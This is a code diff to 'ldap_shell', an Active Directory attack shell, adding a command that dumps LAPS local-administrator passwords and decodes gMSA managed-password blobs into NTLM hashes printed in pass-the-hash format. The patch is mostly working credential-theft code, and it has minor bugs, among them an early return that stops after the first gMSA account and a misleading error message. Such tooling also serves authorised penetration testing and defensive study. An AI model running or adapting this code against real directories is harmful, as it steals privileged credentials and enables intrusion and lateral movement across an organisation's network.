@@ -12,6 +12,7 @@ import re
 import shlex
 import string
 from struct import pack, unpack
+from Cryptodome.Hash import MD4
 
 import OpenSSL
 import ldap3
@@ -30,9 +31,9 @@ from minikerberos.network.clientsocket import KerberosClientSocket
 
 from ldap_shell import ldaptypes
 from ldap_shell.myPKINIT import myPKINIT
+from ldap_shell.Structure import MSDS_MANAGEDPASSWORD_BLOB
 
 log = logging.getLogger('ldap-shell.shell')
-
 
 # noinspection PyMissingOrEmptyDocstring,PyPep8Naming,PyUnusedLocal
 class LdapShell(cmd.Cmd):
@@ -555,27 +556,35 @@ class LdapShell(cmd.Cmd):
         self.search(f'(memberof:{LdapShell.LDAP_MATCHING_RULE_IN_CHAIN}:={escape_filter_chars(group_dn)})',
                     'sAMAccountName', 'name')
 
-    def do_get_laps_password(self, line):
+    def do_get_laps_gmsa(self, line):
         args = shlex.split(line)
+
+        if not self.client.tls_started and not self.client.server.ssl:
+            log.info('Sending StartTLS command...')
+            if not self.client.start_tls():
+                log.error("StartTLS failed")
+                return log.error('Error adding a new computer with LDAP requires LDAPS. Try -use-ldaps flag')
+            else:
+                log.info('StartTLS succeded!')
 
         if len(args) != 0 and len(args) != 1:
             raise Exception(
                 f'Expecting target. Received {len(args)} arguments instead.'
             )
+        #====LAPS=====
         if len(args) == 0:
             self.client.search(self.domain_dumper.root, f'(ms-MCS-AdmPwd=*)',
                                attributes=['ms-MCS-AdmPwd','sAMAccountName'])
             if len(self.client.entries) == 0:
                 log.error(f'This user can\'t read LAPS')
-                return
             else:
                 for e in self.client.entries:
-                    print(e['sAMAccountName'], e['ms-MCS-AdmPwd'])
+                    print('[LAPS]', e['sAMAccountName'], e['ms-MCS-AdmPwd'])
         else:
             self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(args[0])})',
                                attributes=['ms-MCS-AdmPwd'])
             if len(self.client.entries) != 1:
-                raise Exception(f'Error expected only one search result got {len(self.client.entries)} results')
+                log.error(f'Error expected only one search result got {len(self.client.entries)} results')
 
             computer = self.client.entries[0]
             log.info('Found Computer DN: %s', computer.entry_dn)
@@ -586,6 +595,24 @@ class LdapShell(cmd.Cmd):
                 log.info('LAPS Password: %s', password)
             else:
                 log.error('Unable to Read LAPS Password for Computer')
+        #=====GMSA=====
+        self.client.search(self.domain_dumper.root, f'(&(ObjectClass=msDS-GroupManagedServiceAccount))',
+                           attributes=['sAMAccountName','msDS-ManagedPassword','msDS-GroupMSAMembership'])
+        if len(self.client.entries) == 0:
+            print('No gMSAs returned.')
+            return
+        for entry in self.client.entries:
+            sam = entry['sAMAccountName'].value
+            if 'msDS-ManagedPassword' in entry and entry['msDS-ManagedPassword']:
+                data = entry['msDS-ManagedPassword'].raw_values[0]
+                blob = MSDS_MANAGEDPASSWORD_BLOB()
+                blob.fromString(data)
+                currentPassword = blob['CurrentPassword'][:-2]
+                ntlm_hash = MD4.new()
+                ntlm_hash.update(currentPassword)
+                passwd = binascii.hexlify(ntlm_hash.digest()).decode("utf-8")
+                print(f'[GMSA] {sam}:::aad3b435b51404eeaad3b435b51404ee:{passwd}')
+                return
 
     def do_set_genericall(self, line):
         args = shlex.split(line)
@@ -1178,7 +1205,7 @@ Get Info
     search query [attributes,] - Search users and groups by name, distinguishedName and sAMAccountName.
     get_user_groups user - Retrieves all groups this user is a member of.
     get_group_users group - Retrieves all members of a group.
-    get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
+    get_laps_gmsa [account] - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
     get_maq user - Get ms-DS-MachineAccountQuota for current user.
 Abuse ACL
     add_user_to_group user group - Adds a user to a group.
